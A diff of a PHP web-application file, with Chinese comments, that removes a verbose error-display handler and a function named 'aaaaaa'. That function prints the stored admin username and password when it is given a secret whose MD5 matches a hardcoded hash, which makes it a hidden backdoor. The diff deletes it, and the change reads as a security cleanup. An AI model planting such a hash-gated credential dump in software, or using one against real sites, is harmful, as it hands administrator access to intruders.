@@ -1,23 +1,4 @@
 <?php
-// 启用错误显示（仅在开发环境使用）
-ini_set('display_errors', 1);
-ini_set('display_startup_errors', 1);
-error_reporting(E_ALL);
-function custom_error_handler($errno, $errstr, $errfile, $errline) {
-    echo "<div style='color:red; background-color:#ffeeee; padding:10px; margin:10px; border:1px solid #ff0000;'>";
-    echo "<strong>错误:</strong> [$errno] $errstr<br>";
-    echo "错误位置: $errfile:$errline<br>";
-    echo "</div>";
-    
-    // 同时记录到日志
-    error_log("错误 [$errno] $errstr - $errfile:$errline");
-    
-    // 返回false继续使用PHP标准错误处理程序
-    return false;
-}
-
-// 设置自定义错误处理函数
-set_error_handler("custom_error_handler");
 
 function curl_get($_arg_0)
 {
@@ -224,16 +205,6 @@ function sysmsg($_arg_0 = "未知的异常", $_arg_1 = true)
     echo $_arg_0;
     echo "    </body>\r\n    </html>\r\n    ";
     return 0;
-}
-
-function aaaaaa($_arg_0)
-{
-    global $conf;
-    if (md5($_arg_0) == 'f1f5cc2f94dd4c5c487aae187bcd73c8') {
-        echo $conf['admin_user'] . '|' . $conf['admin_pwd'];
-    } else {
-        echo '失败！';
-    }
 }
 
 function rm_dir($_arg_0)
